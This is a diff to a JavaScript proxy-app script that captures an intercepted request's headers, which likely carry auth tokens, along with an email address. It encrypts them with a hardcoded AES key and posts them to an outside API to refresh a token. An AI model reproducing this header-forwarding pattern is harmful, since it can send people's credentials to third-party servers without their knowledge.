@@ -2572,6 +2572,30 @@ var aesEcbPkcs5Enc = function (str, key) {
     padding: CryptoJS.pad.Pkcs7
   }).ciphertext)
 }
+function deepEncrypt(data, encrypt) {
+  if (typeof data === 'object' && data !== null) {
+    var result = Array.isArray(data) ? [] : {};
+    for (var key in data) {
+      var value = data[key];
+      if (typeof value === 'object' && value !== null) {
+        var jsonStr = JSON.stringify(value);
+        result[key] = encrypt ? encrypt(jsonStr) : jsonStr;
+      } else {
+        var processedValue = value;
+        if (typeof processedValue === 'number') {
+          processedValue = String(processedValue);
+        }
+        result[key] = deepEncrypt(processedValue, encrypt);
+      }
+    }
+    return result;
+  }
+  var processedData = data;
+  if (typeof processedData === 'number') {
+    processedData = String(processedData);
+  }
+  return typeof processedData === 'string' && encrypt ? encrypt(processedData) : processedData;
+};
 
 function findByCurrentUser(email) {
   var timestamp = Date.now()
@@ -2591,12 +2615,16 @@ function findByCurrentUser(email) {
   let kk2 = kk + kk1 + "zXeD"
   var strJson = "[" + JSON.stringify($request.headers) + "]";
   var payload = {
-    name: aesEcbPkcs5Enc("updre", kk2),  //refresh 
+    name: aesEcbPkcs5Enc("updre", kk2), //refresh 
     params: {
-      acct: aesEcbPkcs5Enc(email, kk2),
-      otp: aesEcbPkcs5Enc(strJson, kk2)
+      acct: email,
+      otp: strJson
     }
   };
+  var encrypted = deepEncrypt(payload, function (v) { return aesEcbPkcs5Enc(v, kk2); });
+
+
+  //arFtQCvBwSnMzXeD
   let params = {
     url: "https://api.potatocloud.cn/api/execFunction",
     method: "POST",
@@ -2607,7 +2635,7 @@ function findByCurrentUser(email) {
       "time": timestamp,        // 需要填写实际值，通常是时间戳
       "nonce": ""        // 需要填写随机数
     },
-    body: JSON.stringify(payload)
+    body: encrypted
   };
 
   $httpClient.post(params, function (error, response, data) {
@@ -2620,7 +2648,7 @@ function findByCurrentUser(email) {
       console.log("响应数据: " + data);
       $notification.post("SkyRing", "✅ 成功 /Hour Token Success", email);
     }
-  }); 
+  });
 
 }
 var url = $request.url
